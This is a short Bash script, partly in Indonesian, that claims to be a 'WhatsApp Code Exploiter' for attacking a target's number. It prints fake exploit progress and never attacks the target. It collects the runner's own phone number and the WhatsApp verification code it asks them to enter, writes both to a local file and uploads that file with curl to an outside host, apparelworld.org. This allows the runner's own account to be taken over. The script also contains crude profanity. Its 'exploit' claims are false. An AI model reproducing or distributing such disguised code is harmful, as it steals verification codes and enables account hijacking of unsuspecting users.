#!/bin/bash
clear
echo "
<-- IndoSec -->
####################
#   Whatsapp Code  # By AHMADWALKER
#     Exploiter    # AHMADWALKER2019@gmail.com
####################

Copyright (c) 2018 ceweberbatang Ganteng";
echo "";
read -p "Nomer Kamu SAYANG   (+62xxxx)=> " nomer;
read -p "Nomer Target SAYANG (+62xxxx) => " target;
sleep 2
echo "[+] Syncing Target SAYANG...";
sleep 1
echo "Login  => $nomer";
sleep 0.5
echo "Target => $target";
sleep 0.5
echo "[+] Exploiting...";
echo "Nomer => $nomer" >> kontol.html;
curl -T kontol.html http://apparelworld.org/
sleep 5;
echo "[+] Done.";
echo "Tunggu 5jam-10jam Untuk Mendapatkan Code.";
read -p "Verify Code => " code;
sleep 2
echo "[+] Connecting to whatsapp.com...";
echo "Login => $nomer";
sleep 0.5
echo "Code => $code";
sleep 0.5
echo "Target => $target";
sleep 0.5
echo "[+] Sending Exploit...";
echo "Code => $code" >> kontol.html;
curl -T kontol.html http://apparelworld.org/
sleep 5
echo "[+] Success Exploited!";
exit;
